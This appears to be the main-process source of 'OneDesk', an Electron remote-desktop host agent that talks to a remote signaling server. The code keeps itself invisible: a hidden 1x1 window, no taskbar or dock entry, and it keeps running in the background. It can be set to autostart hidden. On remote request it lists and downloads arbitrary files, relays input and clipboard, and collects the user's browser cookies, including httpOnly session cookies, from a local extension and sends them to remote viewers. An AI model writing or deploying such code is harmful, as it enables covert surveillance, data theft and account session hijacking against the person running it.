const { app, BrowserWindow, BrowserView, ipcMain, desktopCapturer, screen, Notification, systemPreferences } = require('electron');
const path = require('path');
const os = require('os');
const fs = require('fs');
const { SignalingClient } = require('./src/signaling');
const { InputSimulator } = require('./src/input-simulator');
const { ClipboardSync } = require('./src/clipboard-sync');
const { FileTransfer } = require('./src/file-transfer');
const { QualityController } = require('./src/quality-controller');
const extensionServer = require('./src/extensionServer');

// ─── State ───────────────────────────────────────────────────────────────────
let hostWindow = null;
let signaling = null;
let inputSimulator = null;
let clipboardSync = null;
let fileTransfer = null;
let qualityController = null;
let remoteBrowserView = null;
let remoteBrowserInterval = null;
let remoteBrowserTarget = null;
let pendingViewerCookieRequests = []; // Array to track viewer socket IDs requesting cookies

const DEVICE_ID = `${os.hostname()}-${process.platform}-${Date.now()}`;
const DEVICE_NAME = os.hostname();

// ─── Platform Setup ─────────────────────────────────────────────────────────
if (process.platform === 'darwin') {
  app.dock.hide();
}

// Disable WebRTC mDNS obfuscation to fix '.local' resolution errors on local networks
app.commandLine.appendSwitch('disable-features', 'WebRtcHideLocalIpsWithMdns');

const gotSingleLock = app.requestSingleInstanceLock();
if (!gotSingleLock) {
  app.quit();
}

// ─── Host Window (Hidden) ───────────────────────────────────────────────────
function createHostWindow() {
  if (hostWindow) return;

  hostWindow = new BrowserWindow({
    show: false, // Completely hidden
    skipTaskbar: true, // Hide from Windows taskbar
    width: 1,
    height: 1,
    webPreferences: {
      preload: path.join(__dirname, 'src', 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false
    }
  });

  hostWindow.loadFile(path.join(__dirname, 'ui', 'host.html'));

  hostWindow.webContents.on('console-message', (event, level, message, line, sourceId) => {
    console.log(`[Host Renderer] ${message}`);
  });

  hostWindow.on('closed', () => {
    hostWindow = null;
  });

  console.log('[Main] Hidden host renderer created');
}

// ─── IPC Handlers ───────────────────────────────────────────────────────────
function setupIPC() {
  // Screen sources
  ipcMain.handle('get-screen-sources', async () => {
    const sources = await desktopCapturer.getSources({
      types: ['screen'],
      thumbnailSize: { width: 320, height: 180 }
    });
    return sources.map(s => ({
      id: s.id,
      name: s.name,
      thumbnail: s.thumbnail.toDataURL()
    }));
  });

  ipcMain.handle('request-media-access', async (_, mediaType) => {
    if (process.platform !== 'darwin') return true;
    const status = systemPreferences.getMediaAccessStatus(mediaType);
    console.log(`[Main] Media access status for ${mediaType}: ${status}`);
    if (status === 'granted') return true;
    if (status === 'not-determined') {
      const granted = await systemPreferences.askForMediaAccess(mediaType);
      console.log(`[Main] User ${granted ? 'granted' : 'denied'} ${mediaType} access`);
      return granted;
    }
    // Status is 'denied' or 'restricted'
    console.error(`[Main] ${mediaType} access is ${status}. Go to System Settings > Privacy & Security > ${mediaType === 'camera' ? 'Camera' : 'Microphone'} and enable access for this app.`);
    return false;
  });

  // Screen info
  ipcMain.handle('get-screen-info', () => {
    const primaryDisplay = screen.getPrimaryDisplay();
    return {
      width: primaryDisplay.size.width,
      height: primaryDisplay.size.height,
      scaleFactor: primaryDisplay.scaleFactor
    };
  });

  // Signaling relay
  ipcMain.on('signal-send', (_, data) => {
    if (signaling) {
      signaling.send(data.event, data.payload);
    }
  });

  // Input Simulation
  ipcMain.on('simulate-input', (_, inputEvent) => {
    if (inputSimulator) {
      inputSimulator.handleEvent(inputEvent);
    }
  });

  // Clipboard
  ipcMain.on('clipboard-write-remote', (_, clipboardData) => {
    if (clipboardSync) {
      clipboardSync.writeFromRemote(clipboardData);
    }
  });

  // File Transfer
  ipcMain.on('file-receive-message', (_, message) => {
    if (fileTransfer) {
      fileTransfer.handleMessage(message);
    }
  });

  // Quality Control
  ipcMain.on('set-quality-preset', (_, preset) => {
    if (qualityController) {
      qualityController.setPreset(preset);
    }
  });

  ipcMain.handle('get-quality-info', () => {
    return qualityController ? qualityController.getInfo() : null;
  });
}

// ─── Cleanup ────────────────────────────────────────────────────────────────
function cleanup() {
  if (signaling) signaling.disconnect();
  if (clipboardSync) clipboardSync.stop();
  if (qualityController) qualityController.stopMonitoring();
}

// ─── App Lifecycle ──────────────────────────────────────────────────────────
app.whenReady().then(() => {
  // Setup IPC
  setupIPC();

  // Initialize production modules
  inputSimulator = new InputSimulator();
  
  clipboardSync = new ClipboardSync();
  clipboardSync.start(500);
  clipboardSync.on('clipboard-changed', (data) => {
    if (hostWindow && !hostWindow.isDestroyed()) {
      hostWindow.webContents.send('clipboard-changed', data);
    }
  });

  fileTransfer = new FileTransfer();
  fileTransfer.on('file-received', (data) => {
    if (Notification.isSupported()) {
      new Notification({
        title: 'File Received',
        body: `${data.name} saved to ${data.path}`
      }).show();
    }
  });

  qualityController = new QualityController();

  // Initialize signaling
  const SIGNALING_URL = process.env.SIGNALING_URL || 'https://onedesk-upet.onrender.com';
  console.log(`[Main] Connecting to signaling server at ${SIGNALING_URL}`);
  
  signaling = new SignalingClient(SIGNALING_URL, {
    deviceId: DEVICE_ID,
    deviceName: DEVICE_NAME,
    type: 'host'
  });

  signaling.on('connected', () => {
    console.log('[Main] Connected to signaling server');
  });

  signaling.on('disconnected', () => {
    console.log('[Main] Disconnected from signaling server');
  });

  // WebRTC signaling relay
  signaling.on('webrtc-offer', (data) => {
    console.log(`[Main] Incoming offer from ${data.senderSocketId}`);
    if (hostWindow && !hostWindow.isDestroyed()) {
      hostWindow.webContents.send('webrtc-offer', data);
    }
  });

  signaling.on('webrtc-ice-candidate', (data) => {
    if (hostWindow && !hostWindow.isDestroyed()) {
      hostWindow.webContents.send('webrtc-ice-candidate', data);
    }
  });

  signaling.on('webrtc-disconnect', (data) => {
    console.log(`[Main] Disconnect request from ${data.senderSocketId}`);
    if (hostWindow && !hostWindow.isDestroyed()) {
      hostWindow.webContents.send('webrtc-disconnect', data);
    }
  });

  // Handle remote commands from Web App
  signaling.on('device-command', (data) => {
    if (data.command === 'toggle_autostart') {
      const currentSettings = app.getLoginItemSettings();
      const newSetting = !currentSettings.openAtLogin;
      
      app.setLoginItemSettings({
        openAtLogin: newSetting,
        path: process.execPath,
        args: [
          '--processStart', `"${process.execPath}"`,
          '--process-start-args', `"--hidden"`
        ]
      });
      
      console.log(`[Main] Auto-start toggled to: ${newSetting}`);
      
      if (Notification.isSupported()) {
        new Notification({
          title: 'OneDesk Settings',
          body: `Auto-Start on boot has been turned ${newSetting ? 'ON' : 'OFF'}.`
        }).show();
      }
    }
  });

  // Handle file system requests
  signaling.on('file-system-request', async (data) => {
    const { senderSocketId, action, path: requestedPath } = data;
    
    try {
      let targetPath = requestedPath;
      if (targetPath === '~') {
        targetPath = os.homedir();
      }

      if (action === 'navigate_up') {
        targetPath = path.dirname(targetPath);
      }

      if (action === 'list_directory' || action === 'navigate_up') {
        // Resolve absolute path securely
        const resolvedPath = path.resolve(targetPath);
        
        // Read directory
        const dirents = await fs.promises.readdir(resolvedPath, { withFileTypes: true });
        const items = [];
        
        for (const dirent of dirents) {
          try {
            const itemPath = path.join(resolvedPath, dirent.name);
            items.push({
              name: dirent.name,
              isDirectory: dirent.isDirectory(),
              size: dirent.isFile() ? (await fs.promises.stat(itemPath)).size : 0,
              path: itemPath
            });
          } catch (e) {
            // Ignore files with permission errors
          }
        }

        signaling.sendFileSystemResponse(senderSocketId, {
          type: 'directory',
          path: resolvedPath,
          items
        });
      }

      if (action === 'download_file') {
        const resolvedPath = path.resolve(targetPath);
        const stats = await fs.promises.stat(resolvedPath);
        
        if (!stats.isFile()) throw new Error('Not a file');

        const CHUNK_SIZE = 64 * 1024; // 64KB
        const fd = await fs.promises.open(resolvedPath, 'r');
        const buffer = Buffer.alloc(CHUNK_SIZE);
        
        let offset = 0;
        let index = 0;

        while (offset < stats.size) {
          const { bytesRead } = await fd.read(buffer, 0, CHUNK_SIZE, offset);
          if (bytesRead === 0) break;
          
          const chunkData = buffer.subarray(0, bytesRead).toString('base64');
          
          signaling.sendFileDownloadChunk(senderSocketId, {
            status: 'chunk',
            index: index,
            data: chunkData
          });
          
          offset += bytesRead;
          index++;
          
          // Small delay to prevent overwhelming the socket
          await new Promise(r => setTimeout(r, 2));
        }
        
        await fd.close();
        
        signaling.sendFileDownloadChunk(senderSocketId, {
          status: 'end'
        });
      }

    } catch (err) {
      console.error('[Main] File System Error:', err);
      if (action === 'download_file') {
        signaling.sendFileDownloadChunk(senderSocketId, { status: 'error', message: err.message });
      } else {
        signaling.sendFileSystemResponse(senderSocketId, { type: 'error', message: err.message });
      }
    }
  });

  // Handle Viewer Extension cookie request
  signaling.on('request-host-cookies', (data) => {
    console.log(`[Main] Viewer ${data.senderSocketId} requested host cookies. Fetching from extension...`);
    pendingViewerCookieRequests.push(data.senderSocketId);
    extensionServer.requestCookies();
  });

  // Handle Remote Browser Requests
  signaling.on('remote-browser-request', async (data) => {
    const { senderSocketId, action, url, event } = data;
    
    // Handle Remote Browser
    if (action === 'start') {
      remoteBrowserTarget = senderSocketId;
      if (!remoteBrowserView) {
        remoteBrowserView = new BrowserWindow({
          width: 1280,
          height: 720,
          show: false,
          webPreferences: {
            offscreen: true, // Use offscreen rendering instead of relying on a hidden host window
            contextIsolation: true,
            sandbox: true,
            partition: 'incognito-remotebrowser' // In-memory incognito session
          }
        });
        
        // Request cookies from extension to sync login session into the incognito window
        extensionServer.requestCookies();

        remoteBrowserView.webContents.on('did-navigate', (e, navigationUrl) => {
          if (remoteBrowserTarget) {
            signaling.sendRemoteBrowserUrl(remoteBrowserTarget, { url: navigationUrl });
          }
        });

        remoteBrowserView.webContents.on('did-navigate-in-page', (e, navigationUrl) => {
          if (remoteBrowserTarget) {
            signaling.sendRemoteBrowserUrl(remoteBrowserTarget, { url: navigationUrl });
          }
        });
        // Use the native paint event for much higher performance and reliability than capturePage polling
        remoteBrowserView.webContents.on('paint', (event, dirty, image) => {
          if (remoteBrowserTarget && !image.isEmpty()) {
            signaling.sendRemoteBrowserFrame(remoteBrowserTarget, {
              image: image.toJPEG(70).toString('base64')
            });
          }
        });
        
        // Target ~15 FPS to balance performance and bandwidth
        remoteBrowserView.webContents.setFrameRate(15);
      }
    }

    if (!remoteBrowserView) return;

    if (action === 'stop') {
      if (remoteBrowserView && !remoteBrowserView.isDestroyed()) {
        remoteBrowserView.destroy();
      }
      remoteBrowserView = null;
      remoteBrowserTarget = null;
    }

    if (action === 'navigate') {
      remoteBrowserView.webContents.loadURL(url);
    }

    if (action === 'goBack') {
      if (remoteBrowserView.webContents.canGoBack()) remoteBrowserView.webContents.goBack();
    }

    if (action === 'goForward') {
      if (remoteBrowserView.webContents.canGoForward()) remoteBrowserView.webContents.goForward();
    }

    if (action === 'reload') {
      remoteBrowserView.webContents.reload();
    }

    if (action === 'input' && event) {
      const wc = remoteBrowserView.webContents;
      const width = 1280;
      const height = 720;
      const x = event.x !== undefined ? Math.floor(event.x * width) : width / 2;
      const y = event.y !== undefined ? Math.floor(event.y * height) : height / 2;

      switch (event.type) {
        case 'mousemove':
          wc.sendInputEvent({ type: 'mouseMove', x, y });
          break;
        case 'mousedown':
          wc.sendInputEvent({ type: 'mouseDown', button: 'left', x, y, clickCount: 1 });
          break;
        case 'mouseup':
          wc.sendInputEvent({ type: 'mouseUp', button: 'left', x, y, clickCount: 1 });
          break;
        case 'scroll':
          wc.sendInputEvent({ type: 'mouseWheel', x, y, deltaX: event.deltaX, deltaY: event.deltaY });
          break;
        case 'keydown':
          wc.sendInputEvent({ type: 'keyDown', keyCode: event.key });
          wc.sendInputEvent({ type: 'char', keyCode: event.key });
          break;
        case 'keyup':
          wc.sendInputEvent({ type: 'keyUp', keyCode: event.key });
          break;
      }
    }
  });

  signaling.connect();
  extensionServer.start(9090);

  extensionServer.on('cookies-received', async (cookies) => {
    if (pendingViewerCookieRequests.length > 0) {
      console.log(`[Main] Forwarding cookies to ${pendingViewerCookieRequests.length} waiting viewers...`);
      for (const socketId of pendingViewerCookieRequests) {
        signaling.socket.emit('host-cookies-response', {
          targetSocketId: socketId,
          cookies: cookies
        });
      }
      pendingViewerCookieRequests = [];
    }

    const electronSession = require('electron').session.fromPartition('incognito-remotebrowser');
    for (const cookie of cookies) {
      let url = (cookie.secure ? 'https://' : 'http://') + cookie.domain.replace(/^\./, '') + cookie.path;
      try {
        let cookieDetails = {
          url: url,
          name: cookie.name,
          value: cookie.value,
          path: cookie.path,
          secure: cookie.secure,
          httpOnly: cookie.httpOnly,
          expirationDate: cookie.expirationDate
        };
        // Host-only cookies and __Host- prefixed cookies MUST NOT have a domain attribute
        if (!cookie.hostOnly && !cookie.name.startsWith('__Host-')) {
          cookieDetails.domain = cookie.domain;
        }
        
        await electronSession.cookies.set(cookieDetails);
      } catch (e) {
        console.error('[Main] Failed to set cookie:', cookie.name, e);
      }
    }
    console.log('[Main] Cookies successfully synced to Remote Browser.');
    if (remoteBrowserView) {
      remoteBrowserView.webContents.reload();
    }
  });

  // Create hidden host renderer
  createHostWindow();

  console.log(`[Main] OneDesk started — Device: ${DEVICE_NAME} (${DEVICE_ID})`);
});

app.on('window-all-closed', () => {
  // Stay running in the background unconditionally
  if (process.platform === 'darwin') {
    app.dock.hide();
  }
});

app.on('before-quit', () => {
  app.isQuiting = true;
  cleanup();
});
